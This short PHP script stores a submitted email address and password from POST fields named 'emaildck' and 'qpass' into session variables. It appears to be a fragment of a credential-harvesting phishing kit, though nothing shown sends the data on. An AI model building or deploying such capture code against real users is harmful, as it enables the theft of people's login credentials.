<?php
ini_set("output_buffering",4096);
session_start();

$_SESSION['duser'] = $date = $_POST['emaildck'];

$_SESSION['dpass'] = $date = $_POST['qpass'];

?>